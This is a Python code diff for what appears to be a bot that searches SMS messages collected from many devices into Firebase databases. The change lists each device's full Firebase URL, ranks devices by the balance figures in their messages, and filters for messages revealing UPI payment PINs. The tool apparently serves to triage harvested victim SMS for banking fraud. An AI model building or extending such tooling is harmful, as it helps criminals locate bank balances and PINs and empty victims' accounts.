@@ -5,6 +5,7 @@ from datetime import datetime
 
 from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_db_label
 from panel_search_bot.search_engine import SearchMatch, SearchParams
+from panel_search_bot.sms_parser import device_has_upi_pin, message_has_pin
 from panel_search_bot.ui import pin_label
 
 
@@ -24,7 +25,7 @@ def _astik_header_line(params: SearchParams) -> str:
     days = "ALL TIME" if params.days is None else f"LAST {params.days} DAYS"
     return (
         f"SMS SEARCH RESULTS - {kw} - {mode} - PIN: {pin} - {sort} - {days} - "
-        "WITHOUT FB (NO URL)"
+        "FULL FIREBASE URL"
     )
 
 
@@ -39,19 +40,64 @@ def format_astik_result_file(
 ) -> str:
     grouped: dict[tuple[str, str], list[SearchMatch]] = defaultdict(list)
     for match in matches:
-        db_label = match.db_label or firebase_db_label(match.firebase_url)
         device = match.device_id or "unknown"
-        grouped[(db_label, device)].append(match)
+        grouped[(match.firebase_url, device)].append(match)
+
+    pin_mode = params.pin_filter
 
     def group_sort_key(item: tuple[tuple[str, str], list[SearchMatch]]):
         _, msgs = item
         best = max((m.balance or 0.0) for m in msgs)
-        return (-best, msgs[0].db_label, msgs[0].device_id)
+        return (-best, msgs[0].firebase_url, msgs[0].device_id)
 
     device_groups = sorted(grouped.items(), key=group_sort_key)
     generated = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-
     done = dbs_completed if dbs_completed is not None else dbs_scanned
+
+    body_lines: list[str] = []
+    out_index = 0
+    pin_mode = params.pin_filter
+
+    for (_firebase_url, _device_id), msgs in device_groups:
+        msgs_sorted = sorted(
+            msgs,
+            key=lambda m: (m.message_at or datetime.min),
+            reverse=True,
+        )
+        if pin_mode == "with" and not device_has_upi_pin(msgs_sorted):
+            continue
+        if pin_mode == "without" and device_has_upi_pin(msgs_sorted):
+            continue
+
+        if pin_mode == "with":
+            msgs_sorted = [m for m in msgs_sorted if m.has_pin or message_has_pin(m.body)]
+        elif pin_mode == "without":
+            msgs_sorted = [m for m in msgs_sorted if not m.has_pin and not message_has_pin(m.body)]
+        if not msgs_sorted:
+            continue
+
+        out_index += 1
+        firebase_url = _firebase_url
+        device_id = _device_id
+        db_label = firebase_db_label(firebase_url)
+        device_pin = "YES" if device_has_upi_pin(msgs_sorted) else "NO"
+        body_lines.append(f"#{out_index}")
+        body_lines.append(f"Device ID: {device_id}")
+        body_lines.append(f"DB: {db_label}")
+        body_lines.append(f"Firebase: {firebase_url}")
+        body_lines.append(f"UPI PIN: {device_pin}")
+        body_lines.append(f"SMS Count: {len(msgs_sorted)}")
+        body_lines.append("-----------------------------------------")
+        for msg in msgs_sorted:
+            ts = msg.message_at.strftime("%d-%m-%Y %H:%M:%S") if msg.message_at else ""
+            head = f"[{msg.sender}]"
+            if ts:
+                head = f"{ts} {head}"
+            body_lines.append(head)
+            body_lines.append(msg.body.strip())
+            body_lines.append("-----------------------------------------")
+        body_lines.append("")
+
     lines = [
         _astik_header_line(params),
         *(
@@ -61,33 +107,10 @@ def format_astik_result_file(
         ),
         f"Generated: {generated}",
         f"Search time: {elapsed_sec:.0f}s",
-        f"Total matches: {len(matches)} | Devices: {len(device_groups)} | "
-        f"DBs done: {done}/{dbs_scanned}",
+        f"Total matches: {len(matches)} | Devices: {out_index} | DBs done: {done}/{dbs_scanned}",
         "",
+        *body_lines,
     ]
-
-    for index, ((db_label, device_id), msgs) in enumerate(device_groups, start=1):
-        msgs_sorted = sorted(
-            msgs,
-            key=lambda m: (m.message_at or datetime.min),
-            reverse=True,
-        )
-        device_pin = "YES" if any(m.has_pin for m in msgs_sorted) else "NO"
-        lines.append(f"#{index}")
-        lines.append(f"Device ID: {device_id}")
-        lines.append(f"DB: {db_label}")
-        lines.append(f"UPI PIN: {device_pin}")
-        lines.append(f"SMS Count: {len(msgs_sorted)}")
-        lines.append("-----------------------------------------")
-        for msg in msgs_sorted:
-            ts = msg.message_at.strftime("%d-%m-%Y %H:%M:%S") if msg.message_at else ""
-            head = f"[{msg.sender}]"
-            if ts:
-                head = f"{ts} {head}"
-            lines.append(head)
-            lines.append(msg.body.strip())
-            lines.append("-----------------------------------------")
-        lines.append("")
 
     return "\n".join(lines).rstrip() + "\n"
 
